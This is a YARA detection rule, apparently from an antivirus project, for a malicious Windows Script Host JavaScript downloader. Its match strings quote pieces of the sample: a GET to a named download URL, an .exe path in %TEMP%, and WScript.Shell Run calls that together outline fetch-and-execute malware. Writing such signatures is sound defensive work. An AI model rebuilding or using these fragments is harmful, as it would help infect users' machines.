rule sig_20160329_45213f1c4ab76ad983d1c63f1199bf58 {
  meta:
    description = "datamaliciousorder - file 20160329_45213f1c4ab76ad983d1c63f1199bf58.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6024ac0d41677981ec0855fc237b5f42989c3b90de196d446f38f76b2dc4c069"

  strings:
    $s1  = "BA[To](\"GET\", \"http://energq.com/e3ola\", false);" fullword ascii
    $s2  = "function Q() {return jo[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3rvhppDWXg3kF.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Mq](Y() * 11); if (BA[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var jo = function fi() {return WScript[rc](\"WScript.Shell\");}(), MU = 11;" fullword ascii
    $s5  = "function ee(g, nU){Yq = Yq * 1; return g - nU;};" fullword ascii
    $s6  = "function Y0(){return \"\" + o;};" fullword ascii
    $s7  = "function C() {return ((f0 == true) && (f0 == U)) ? 1 : Yq;};" fullword ascii
    $s8  = "function u(W){jo[\"Run\"](W, Yq, Yq);};" fullword ascii
    $s9  = " while (f){" fullword ascii
    $s10 = "function Z(PA) {var KS = (1, 2, 3, 4, 5, PA); return KS;};" fullword ascii
    $s11 = "function Y(){return 22;};" fullword ascii
    $s12 = "return ee(J, HS);" fullword ascii
    $s13 = "function v()" fullword ascii
    $s14 = "function RK(){return rc;};" fullword ascii
    $s15 = "var Pt = new this[\"Date\"]();" fullword ascii
    $s16 = "var y = false;" fullword ascii
    $s17 = "U = true; " fullword ascii
    $s18 = "var U = false;" fullword ascii
    $s19 = "var f0 = false;" fullword ascii
    $s20 = "f0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}